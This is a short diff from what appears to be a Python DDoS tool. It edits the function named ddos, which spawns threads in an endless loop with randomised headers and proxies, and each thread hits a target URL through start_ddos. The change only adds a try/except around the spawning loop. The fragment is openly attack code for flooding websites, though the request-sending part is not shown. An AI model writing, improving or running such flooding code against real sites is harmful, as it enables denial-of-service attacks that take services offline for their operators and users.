@@ -59,11 +59,13 @@ def ddos(prox, url):
 	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
 	color = random.choice(colors)
 	while True:
-		headers = Headers(headers=True).generate()
-		thread_list = []
-		t = threading.Thread (target=start_ddos, args=(prox, url, headers, proxies, color))
-		thread_list.append(t)
-		t.start()
+		try:
+			headers = Headers(headers=True).generate()
+			thread_list = []
+			t = threading.Thread (target=start_ddos, args=(prox, url, headers, proxies, color))
+			thread_list.append(t)
+			t.start()
+		except: break	
 
 def start_ddos(prox, url, headers, proxies, color):
 	try:
